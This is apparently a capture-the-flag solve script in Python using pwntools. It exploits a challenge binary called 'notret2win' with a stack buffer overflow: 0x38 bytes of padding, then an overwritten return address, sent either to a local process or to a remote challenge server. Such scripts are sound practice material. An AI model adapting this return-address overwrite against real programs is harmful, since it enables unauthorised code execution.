from pwn import *


# initialize the binary
elf = context.binary = ELF("./notret2win")

if args.REMOTE:  # use python3 solve.py REMOTE
    p = remote("challenges.htu.edu.jo", 10189)  # random port generated (change it)
else:
    p = elf.process()


# craft payload
payload = b"a" * 0x38
payload += p64(0x401248)


# get to input and send payload
p.recvline()
p.sendline(payload)


# get flag!
p.interactive()
